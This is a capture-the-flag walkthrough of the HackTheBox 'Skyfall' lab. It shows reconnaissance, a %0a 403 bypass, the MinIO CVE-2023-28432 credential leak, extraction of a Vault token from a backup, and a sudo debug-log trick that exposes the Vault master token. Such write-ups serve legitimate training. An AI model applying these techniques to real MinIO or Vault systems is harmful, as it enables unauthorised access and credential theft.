---
title: "CTF: Skyfall (HTB, Linux, Insane)"
excerpt: "A detailed walkthrough of \"Skyfall\" machine on HackTheBox."
tagline: "Breach insecure cloud storage!"
header:
  teaser: /docs/assets/images/teasers/ctf/skyfall.png
  og_image: /docs/assets/images/teasers/ctf/skyfall.png
  overlay_image: /docs/assets/images/teasers/ctf/skyfall2.png
author_profile: false
share: false
tags:
  - HackTheBox
  - Linux
  - Difficulty-Insane
  - Information Disclosure
  - Cloud
categories:
  - CTF
toc: true
toc_sticky: true
toc_label: "Table of Contents"
---

## Description

This is a detailed walkthrough of "Skyfall" machine on HackTheBox that is based on Linux operating system and categorized as "Insane" by difficulty. "Sky Storage", a cloud storage service provider, is utilizing MinIO Object Store as the engine for their platform. Exploit its vulnerabilities to discover a path into the heart of the system passing through a built-in Secret Manager, Hashicorp Vault! This machine requires the Challenger to dedicate a significant portion of their time to documentation analysis as well as configuring all the necessary applications and dependencies.

## Reconnaissance

**nmap** will reveal the following on the target machine:

```bash
nmap -sT -sC -sV -T4 <IP> #-sT - TCP scan; -sC - run default scripts, -sV - enumerate service version, -T4 - scan speed
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/nmapscan.png" alt="">
  <figcaption>Results of nmap scan.</figcaption>
</figure>

At this stage, the only port of interest is 80/http. Subdomain enumeration by **ffuf** finds one domain, though it can also be discovered by clicking on the "Request demo" link on the original website *http://skyfall.htb*.

```bash
ffuf -H 'Host: FUZZ.skyfall.htb' -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -t 50 -u http://skyfall.htb -ac
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/ffuf.png" alt="">
  <figcaption>"demo" subdomain discovered.</figcaption>
</figure>

After navigating to *demo.skyfall.htb*, The Challenger is greeted with a login page:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/demologin.png" alt="">
  <figcaption></figcaption>
</figure>

Sign in with the credentials shown on the page, *guest/guest*, to reveal the website's contents:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/demowebsite.png" alt="">
  <figcaption>Website dashboard.</figcaption>
</figure>

### 403 Bypass

As one can see on the Dashboard tab, the tasks assigned to developers mention that **MinIO Storage** is installed on the backend. There's also some very eye-catching functionality on the sidebar: file download/upload ("Files" section) and URL fetching. Attempting to exploit those in any way to gain a foothold does not work. Visiting "Beta Features" section returns a *"403 Forbidden"* response which can't be bypassed. However, this is not the case for **MinIO Metrics** page.

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/metrics403.png" alt="">
  <figcaption>403 Forbidden.</figcaption>
</figure>

Visit the same page by appending **%0a** (URL-encoded "\\n" symbol) to the end of the URL.

*http://demo.skyfall.htb/metrics%0a*

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/metricsbypassed.png" alt="">
  <figcaption>Backend information revealed.</figcaption>
</figure>

We have now obtained MinIO endpoint URL (*http://prd23-s3-backend.skyfall.htb*) and the port on which the application is listening (9000). The time has come for vulnerability research.

### CVE-2023-28432: Information Disclosure

Eventually, researching leads to **CVE-2023-28432: Minio Information Disclosure Vulnerability**. To summarize it, sending a POST request to */minio/bootstrap/v1/verify* API endpoint leaks backend configuration, where MinIO user and password can be found. Let's issue the request in **BurpSuite**:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/cve202328432.png" alt="">
  <figcaption>MinIO root user credentials leaked.</figcaption>
</figure>

Copy and save the values for:
* MINIO_ROOT_USER
* MINIO_ROOT_PASSWORD

### MinIO Client Installation

Now it is necessary to install **MinIO Client**. Follow these [instructions](https://min.io/docs/minio/linux/reference/minio-mc.html) to do so. The page also contains an overview of commands supported by MinIO Client.

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/minioinstall.png" alt="">
  <figcaption>MinIO installation commands.</figcaption>
</figure>

### Enumeration with MinIO Client

Upon successfull installation, create an alias for your MinIO Client supplied with discovered credentials and MinIO backend endpoint address to be able to connect to it faster:

```bash
mc alias set myminio http://prd23-s3-backend.skyfall.htb MINIO_ROOT_USER MINIO_ROOT_PASSWORD
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/mcaliasset.png" alt="">
  <figcaption>MinIO alias created.</figcaption>
</figure>

Test connectivity with MinIO server by executing the following command:

```bash
mc admin info myminio
```

If everything was installed and configured correctly, you will get the following output:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/mcadmininfo.png" alt="">
  <figcaption>Storage info is displayed, connection has been established.</figcaption>
</figure>

Now let's list the contents of the storage.

```bash
mc ls myminio
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/mclsmyminio.png" alt="">
  <figcaption></figcaption>
</figure>

The directories within the storage seem like user home directories. None of them contain nothing valuable, except for **askyy** (Aurora Skyy, lead developer of Sky Storage, according to the website). Her directory can be enumerated with this command:

```bash
mc ls --recursive --versions myminio/askyy
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/askyydir.png" alt="">
  <figcaption>There are different versions of user's home directory backup inside!</figcaption>
</figure>

Directory **askyy** contains 3 versions of the corresponding user's home directory backup. Examine the one highlighted above:

```bash
# copy the backup file to the Attacker machine:
mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 myminio/askyy/home_backup.tar.gz /YOUR/DESIRED/PATH
# extract its contents:
gunzip home_backup.tar.gz
tar –xvf home_backup.tar.gz -C /PATH
# list directory contents
ls -la
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/askyyhome.png" alt="">
  <figcaption></figcaption>
</figure>

Indeed, the backup file contained user home directory. Now examine the contents of **.bashrc** file:

```bash
cat .bashrc
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/askyybashrc.png" alt="">
  <figcaption>ENV variables discovered!</figcaption>
</figure>

## Foothold

The above environment variables refer to [HashiCorp Vault]( https://blog.min.io/minio-and-hashicorp-vault/) that MinIO uses for data encryption and secret management. It is necessary to install **Vault client** on the Attacker machine in order to exploit the discovered **Vault token** and establish a foothold on the target system. The following resources contain required information:

* [Vault Installation Instructions](https://developer.hashicorp.com/vault/docs/install#package-manager)
* [Vault Environment Variables](https://developer.hashicorp.com/vault/docs/commands#environment-variables)
* [Vault Commands](https://developer.hashicorp.com/vault/docs/commands)
* [Vault One-Time SSH Passwords](https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords)

Per documentation, in order to connect to the target system with Vault over ssh, two environment variables need to be configured:

```bash
export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="VAULT TOKEN LEAKED FROM ASKYY'S .bashrc"
```

Once the above environment variables have been exported, connect to the target machine with the following command:

```bash
vault login $VAULT_TOKEN
```
<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/vaultlogin.png" alt="">
  <figcaption>Successful login.</figcaption>
</figure>

Per this [post]( https://stackoverflow.com/questions/70234255/how-to-identify-what-paths-can-be-accessed-with-what-capabilities-in-hashicorp-v), it's possible to enumerate what resources we can access with the current token as well as the actions that can be applied to those resources with this command:

```bash
vault read sys/internal/ui/resultant-acl --format=json|jq -r .data
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/vaultreadsys.png" alt="">
  <figcaption></figcaption>
</figure>

It's possible to use **list** argument for ssh:

```bash
vault list ssh/roles
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/vaultlistssh.png" alt="">
  <figcaption>Revealed roles for SSH users with configured OTP authentication.</figcaption>
</figure>

Use the role **dev_otp_key_role** to login via ssh as *askyy*:

```bash
vault ssh -role dev_otp_key_role -mode otp askyy@<IP ADDRESS>
```

When the system prompts for password, copy and paste the generated OTP key to authenticate:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/askyylogin.png" alt="">
  <figcaption>Foothold established.</figcaption>
</figure>

### User flag

List the contents of */home/askyy/user.txt* to get the user flag:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/userflag.png" alt="">
  <figcaption></figcaption>
</figure>


## Privilege Escalation

Compare to everything this challenge has put you through so far, the finale appears to be a grasp of fresh air. It is easy, straightforward and will not claim much of the Challenger's time and mental health.

Check what the user can run as root with **sudo -l**:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/sudol.png" alt="">
  <figcaption></figcaption>
</figure>

The command *sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d* creates a **debug.log** file in user's home directory. Listing its contents will not work since the file will belong to **root** user, and our current has no permissions to access this file. However, this can be bypassed by creating a **debug.log** file in home directory prior to running the command, which in return would append its output to already existing file. Since the file was originally created by our current user, we can display its contents.

```bash
touch debug.log
sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d
cat debug.log
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/mastertoken.png" alt="">
  <figcaption>Vault master token revealed!</figcaption>
</figure>


**Vault master token has been revealed**, which means we can now attempt to use it to login as **root**. Follow the same flow that was described for logging in as *askyy* over ssh.

```bash
export VAULT_TOKEN="MASTER_TOKEN_VALUE"
vault login $VAULT_TOKEN
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/vaultroot.png" alt="">
  <figcaption>Connected to Vault as root.</figcaption>
</figure>

Authentication to Vault with Master Token was successfull. Login to the system over ssh and obtain root flag (use **admin_otp_key_role**):


```bash
vault ssh -role admin_otp_key_role root@<IP ADDRESS>
cat root.txt
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/skyfall/root.png" alt="">
  <figcaption></figcaption>
</figure>

### Verdict

Regardless of exhausting documentation analysis and the need to install required applications (which also might be time-consuming if one has to update related dependencies on the system), this machine turned out to be enjoyable in the end, especially in comparison to the machines released within several previous months during Hackers Rift Open Beta Season III and Season 4 (event on Hack The Box). It provided something new to explore and made an emphasys on research, avoiding common exploitation scenarios. Hell, it even prompted the Author to write this verdict in the end, which truly means something!

**Thank you for your attention and happy hacking!**
{: .notice--primary}
